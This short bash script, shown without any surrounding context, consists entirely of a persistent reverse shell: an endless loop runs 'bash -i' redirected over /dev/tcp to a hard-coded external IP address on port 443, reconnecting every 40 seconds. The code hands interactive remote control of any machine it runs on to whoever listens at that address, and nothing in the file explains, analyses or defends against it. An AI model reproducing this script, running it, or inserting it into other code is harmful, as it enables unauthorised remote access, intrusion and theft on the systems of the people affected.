#!/bin/bash
while :
do
    bash -i >& /dev/tcp/3.81.106.119/443 0>&1 
    sleep 40
done
